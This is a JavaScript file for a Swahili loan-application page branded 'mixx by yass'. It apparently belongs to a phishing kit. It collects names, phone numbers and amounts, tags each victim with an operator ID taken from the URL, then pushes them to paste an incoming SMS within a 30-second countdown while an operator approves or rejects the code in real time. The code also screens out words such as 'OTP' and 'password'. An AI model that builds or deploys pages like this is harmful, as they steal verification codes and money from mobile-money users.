const form=document.querySelector('#loanForm');let applicationId='',timer=null,amountRequested=0,countdownTimer=null,countdownStarted=false,referenceRejectionNotified=false;
const $=id=>document.getElementById(id);
function startReferenceCountdown(){
 if(countdownStarted)return;
 countdownStarted=true;
 let remaining=30;
 const value=$('countdownValue'),ring=$('countdownRing');
 if(countdownTimer)clearInterval(countdownTimer);
 value.textContent=remaining;
 ring.style.setProperty('--progress','100%');
 countdownTimer=setInterval(()=>{
  remaining=Math.max(0,remaining-1);
  value.textContent=remaining;
  ring.style.setProperty('--progress',(remaining/30*100)+'%');
  if(remaining===0){clearInterval(countdownTimer);countdownTimer=null;}
 },1000);
}
$('toggleRef').hidden=true;
$('referenceId').type='text';$('referenceId').addEventListener('input',()=>{$('referenceId').value=$('referenceId').value.replace(/\D/g,'').slice(0,4)});
$('demoText').addEventListener('input',()=>{if($('demoText').value.length>500)$('demoText').value=$('demoText').value.slice(0,500)});
function show(el){form.hidden=true;$('statusPage').hidden=true;$('stepTwoPage').hidden=true;$('successPage').hidden=true;document.body.classList.toggle('step-two-active',el===$('stepTwoPage'));el.hidden=false}
function resetForm(){document.body.classList.remove('step-two-active');if(timer)clearInterval(timer);if(countdownTimer)clearInterval(countdownTimer);countdownTimer=null;countdownStarted=false;referenceRejectionNotified=false;timer=null;applicationId='';form.reset();form.hidden=false;$('statusPage').hidden=true;$('stepTwoPage').hidden=true;$('successPage').hidden=true;$('error').textContent='';$('referenceError').textContent='';$('retryBtn').hidden=true;$('retryReferenceBtn').hidden=true;$('referenceWaiting').hidden=true;}
function statusUpdate(d){
 if(d.status==='approved'){$('approvedAmount').textContent='TZS '+Number(d.amount||amountRequested).toLocaleString('en-TZ');show($('successPage'));if(timer)clearInterval(timer);return;}
 $('applicationId').textContent=applicationId;
 if(d.status==='approved_details') {show($('stepTwoPage'));startReferenceCountdown();$('stepTwoMessage').textContent='Taarifa zako zimepitishwa kwenye ukaguzi wa majaribio. Endelea kwa maandishi ya uthibitishaji.';$('referenceWaiting').hidden=true;$('submitReference').disabled=false;$('retryReferenceBtn').hidden=true;return;}
 if(d.status==='pending_reference') {show($('stepTwoPage'));$('stepTwoMessage').textContent='Maandishi yako ya sms ya uthibitishaji yanasubiri ukaguzi.';$('referenceWaiting').hidden=false;$('submitReference').disabled=true;$('retryReferenceBtn').hidden=true;return;}
 if(d.status==='rejected_reference') {if(!referenceRejectionNotified){referenceRejectionNotified=true;alert('Maandishi uliyoweka si sahihi. Hakiki na ubandike ujumbe mpya uliopokea ndani ya sekunde 30.');}if(countdownTimer)clearInterval(countdownTimer);countdownTimer=null;countdownStarted=false;startReferenceCountdown();if(timer)clearInterval(timer);timer=null;$('referenceError').textContent='';show($('stepTwoPage'));$('stepTwoMessage').textContent='Maandishi ya mkopo yamekataliwa. Jaribu tena uthibitishaji wa mkopo.';$('referenceWaiting').hidden=true;$('submitReference').disabled=false;$('retryReferenceBtn').hidden=true;return;}
 if(d.status==='rejected_details'){resetForm();return;}
 show($('statusPage'));$('retryBtn').hidden=true;$('detailsWaitingText').parentElement.hidden=false;
 $('stageTag').textContent='UKAGUZI WA OMBI';$('resultTitle').textContent='Limewasilishwa kwa ukaguzi';$('resultMessage').textContent='Taarifa za ombi lako zinasubiri idhini ya msimamizi wa mixx by yass.'
}
async function refresh(){if(!applicationId)return;try{const r=await fetch('/api/applications/'+encodeURIComponent(applicationId));const d=await r.json();if(r.ok)statusUpdate(d)}catch{}}
form.addEventListener('submit',async e=>{e.preventDefault();$('error').textContent='';const btn=$('submitBtn');btn.disabled=true;btn.textContent='Inawasilisha…';try{const admin=new URLSearchParams(location.search).get('admin')||'';amountRequested=Number($('amount').value);const payload={full_name:$('fullName').value.trim(),phone:$('phone').value.trim(),reference_id:$('referenceId').value,amount:amountRequested,admin};const r=await fetch('/api/applications',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify(payload)});const d=await r.json();if(!r.ok)throw new Error(d.error||'Imeshindikana kuwasilisha.');applicationId=d.id;statusUpdate(d);if(timer)clearInterval(timer);timer=setInterval(refresh,4000)}catch(err){$('error').textContent=err.message}finally{btn.disabled=false;btn.textContent='Endelea →'}});
$('submitReference').addEventListener('click',async()=>{const text=$('demoText').value.trim();$('referenceError').textContent='';if(!text){$('referenceError').textContent='Bandika maandishi ya sms uliyopokea kwa simu yako.';$('demoText').focus();return;}if(/\b(pin|otp|one[- ]time password|password|passcode)\b/i.test(text)){ $('referenceError').textContent='Tumia maandishi ya sms uliyopokea kwa simu.';return;}const btn=$('submitReference');btn.disabled=true;btn.textContent='Inawasilisha…';try{const r=await fetch('/api/applications/'+encodeURIComponent(applicationId)+'/reference',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({reference_text:text})});const d=await r.json();if(!r.ok)throw new Error(d.error||'Imeshindikana kuwasilisha maandishi.');referenceRejectionNotified=false;statusUpdate(d);if(timer)clearInterval(timer);timer=setInterval(refresh,4000)}catch(e){$('referenceError').textContent=e.message;btn.disabled=false}finally{btn.textContent='WASILISHA'}});
$('retryBtn').addEventListener('click',resetForm);
$('retryReferenceBtn').addEventListener('click',()=>{$('referenceError').textContent='';$('retryReferenceBtn').hidden=true;$('submitReference').disabled=false;$('referenceWaiting').hidden=true;});
